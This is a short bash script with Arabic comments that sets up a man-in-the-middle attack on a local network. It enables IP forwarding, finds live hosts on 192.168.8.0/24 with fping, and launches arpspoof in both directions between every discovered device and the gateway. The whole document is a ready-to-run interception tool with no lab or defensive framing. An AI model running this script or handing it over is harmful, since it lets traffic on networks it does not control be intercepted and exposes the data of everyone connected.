#!/bin/bash

# تمكين التوجيه عبر IP Forward
echo "تمكين التوجيه عبر IP Forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1

# أدخل عنوان IP للمودم (البوابة)
read -p "أدخل عنوان IP للمودم (البوابة): " gateway_ip

# محاولة اكتشاف واجهة الشبكة تلقائيًا
interface=$(ip route | grep default | awk '{print $5}')
echo "تم تحديد واجهة الشبكة: $interface"

# استخراج الأجهزة المتصلة عبر fping
echo "استخراج الأجهزة المتصلة..."
connected_devices=$(fping -a -g 192.168.8.0/24 2>/dev/null)

# عرض الأجهزة المتصلة
echo "تم العثور على الأجهزة التالية:"
echo "$connected_devices"

# تنفيذ ARP Spoofing على كل جهاز متصل (من الجهاز إلى المودم)
echo "تنفيذ ARP Spoofing من الجهاز إلى المودم..."
for device in $connected_devices; do
    if [[ $device != $gateway_ip ]]; then
        echo "تنفيذ ARP Spoofing على $device ..."
        sudo arpspoof -i $interface -t $gateway_ip $device &
        sleep 1
    fi
done

# تنفيذ ARP Spoofing على المودم (من المودم إلى الأجهزة)
echo "تنفيذ ARP Spoofing من المودم إلى الأجهزة..."
for device in $connected_devices; do
    if [[ $device != $gateway_ip ]]; then
        echo "تنفيذ ARP Spoofing على المودم لتوجيه الحزم إلى $device ..."
        sudo arpspoof -i $interface -t $device $gateway_ip &
        sleep 1
    fi
done

# الانتظار حتى تكتمل العمليات
wait

echo "العملية اكتملت. التوجيه وتنفيذ ARP Spoofing جاريين. اضغط Ctrl+C لإيقاف العمليات."
